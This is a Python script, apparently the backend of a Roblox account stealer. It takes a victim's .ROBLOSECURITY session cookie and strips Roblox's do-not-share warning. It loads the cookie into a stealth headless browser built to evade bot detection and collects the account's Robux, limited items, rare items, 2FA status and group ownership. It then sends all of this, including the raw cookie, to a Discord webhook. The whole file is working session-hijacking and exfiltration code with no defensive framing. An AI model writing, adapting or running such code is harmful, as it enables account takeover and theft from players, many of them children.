import sys
import os
import re
import asyncio
from datetime import datetime, timezone
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    
    if len(raw_str) < 30 and not raw_str.startswith("sys") and not raw_str.startswith("_|WARNING"):
        return None

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    
    cleaned = cookie.lstrip('.').rstrip(';').strip()
    if len(cleaned) < 50:
        return None
        
    return cleaned

async def run_extraction():
    if len(sys.argv) < 2:
        sys.exit(1)
    
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not webhook_url:
        sys.exit(1)

    raw_cookie = extract_and_clean_cookie(sys.argv[1])
    if not raw_cookie:
        sys.exit(0)

    async with async_playwright() as p:
        # Launch browser in headless mode with realistic viewport and arguments
        browser = await p.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-infobars"
            ]
        )
        
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            viewport={"width": 1920, "height": 1080},
            locale="en-US"
        )

        # Inject the .ROBLOSECURITY cookie into Roblox's domain before navigating
        await context.add_cookies([{
            "name": ".ROBLOSECURITY",
            "value": raw_cookie,
            "domain": ".roblox.com",
            "path": "/",
            "httpOnly": True,
            "secure": True,
            "sameSite": "Lax"
        }])

        page = await context.new_page()
        await stealth_async(page)

        try:
            # Navigate to home to establish session context and bypass DataDome challenges naturally
            await page.goto("https://www.roblox.com/home", wait_until="networkidle", timeout=15000)
        except Exception:
            pass

        # Helper to fetch JSON endpoints safely inside the authenticated browser context
        async def fetch_json(url):
            try:
                res = await page.evaluate(f"""async () => {{
                    const r = await fetch('{url}');
                    if (!r.ok) return null;
                    return await r.json();
                }}""")
                return res
            except Exception:
                return None

        # 1. Authenticated User Info
        auth_data = await fetch_json("https://users.roblox.com/v1/users/authenticated")
        if not auth_data or not auth_data.get("id"):
            await browser.close()
            sys.exit(1)

        user_id = auth_data.get("id")
        username = auth_data.get("name", "Unknown")
        display_name = auth_data.get("displayName", username)

        # 2. Account Age & Details
        user_info = await fetch_json(f"https://users.roblox.com/v1/users/{user_id}") or {}
        created = user_info.get("created", "")
        age_days = 0
        if created:
            try:
                created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
                age_days = (datetime.now(timezone.utc) - created_dt).days
            except Exception:
                pass

        # 3. Robux Currency
        robux_res = await fetch_json(f"https://economy.roblox.com/v1/users/{user_id}/currency") or {}
        robux = robux_res.get("robux", 0)

        # 4. Pending Robux
        trans_res = await fetch_json(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary&timeFrame=Year") or {}
        pending = trans_res.get("pendingRobuxTotal", 0)

        # 5. Limiteds / RAP
        limiteds = []
        cursor = ""
        page_count = 0
        while page_count < 2:
            url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100"
            if cursor:
                url += f"&cursor={cursor}"
            r = await fetch_json(url)
            if not isinstance(r, dict):
                break
            for item in r.get("data", []):
                limiteds.append(item.get("recentAveragePrice", 0))
            cursor = r.get("nextPageCursor")
            page_count += 1
            if not cursor:
                break

        rap = sum(limiteds)
        lim_count = len(limiteds)

        # 6. Premium Status
        prem_res = await fetch_json(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
        premium = prem_res is True

        # 7. Special Items (Korblox, Headless, Violet Valk)
        async def check_bundle(b_id):
            res = await fetch_json(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{b_id}/is-owned")
            return res is True

        async def check_asset(a_id):
            res = await fetch_json(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{a_id}/is-owned")
            return res is True

        korblox = await check_bundle(192)
        headless = await check_bundle(201)
        violet_valk = await check_asset(799742571)

        # 8. Groups
        groups_res = await fetch_json(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles") or {}
        groups = groups_res.get("data", [])
        group_count = len(groups)
        owned_groups = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)

        # 9. Account Settings
        email_res = await fetch_json("https://accountsettings.roblox.com/v1/email") or {}
        email_ver = email_res.get("verified", False)

        meta_res = await fetch_json("https://twostepverification.roblox.com/v1/metadata") or {}
        twofa = meta_res.get("twoStepVerificationEnabled", False)

        # 10. Game Badges (Adopt Me, MM2, PS99)
        async def check_played(universe_id):
            badges_res = await fetch_json(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100") or {}
            if isinstance(badges_res, dict):
                for badge in badges_res.get("data", []):
                    if badge.get("awardingUniverse", {}).get("id") == universe_id:
                        return True
            return False

        adopt_played = await check_played(383310974)
        mm2_played = await check_played(142823291)
        ps99_played = await check_played(3259657279)

        await browser.close()

        # Send to Discord via standard requests post
        import requests
        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

        payload = {
            "content": "@everyone",
            "username": f"{username} | Stats",
            "avatar_url": avatar_url,
            "embeds": [
                {
                    "title": f"🎮 {username} | Roblox Stats",
                    "description": f"[Stats Link](https://www.rolimons.com/player/{user_id}) | [Roblox Profile](https://www.roblox.com/users/{user_id}/profile)",
                    "color": 0x2B2D31,
                    "thumbnail": {"url": avatar_url},
                    "fields": [
                        {"name": "🐱 Username", "value": f"```{username}```", "inline": False},
                        {"name": "📋 Account Stats", "value": f"+ Account Age: `{age_days} Days`\n+ Premium: `{premium}`", "inline": False},
                        {"name": "🪙 Robux", "value": f"Balance: `{robux:,}`\nPending: `{pending:,}`", "inline": True},
                        {"name": "💎 Limiteds", "value": f"RAP: `{rap:,}`\nLimiteds: `{lim_count}`", "inline": True},
                        {"name": "👑 Special Items", "value": f"+ Korblox: `{korblox}`\n+ Headless: `{headless}`\n+ Violet Valk: `{violet_valk}`", "inline": False},
                        {"name": "⚙️ Settings", "value": f"+ Email Verified: `{email_ver}`\n+ 2FA: `{twofa}`", "inline": True},
                        {"name": "👥 Groups", "value": f"Owned: `{owned_groups}`\nJoined: `{group_count}`", "inline": True},
                        {"name": "⭐ Games", "value": f"- Adopt Me: `{adopt_played}`\n- MM2: `{mm2_played}`\n- PS99: `{ps99_played}`", "inline": False}
                    ],
                    "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
                    "timestamp": datetime.now(timezone.utc).isoformat()
                },
                {
                    "title": "🍪 Session Cookie Data",
                    "description": f"```text\n{raw_cookie}\n```",
                    "color": 0x2B2D31,
                    "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
                }
            ],
            "allowed_mentions": {"parse": ["everyone"]}
        }

        requests.post(webhook_url, json=payload, timeout=5)

if __name__ == "__main__":
    asyncio.run(run_extraction())
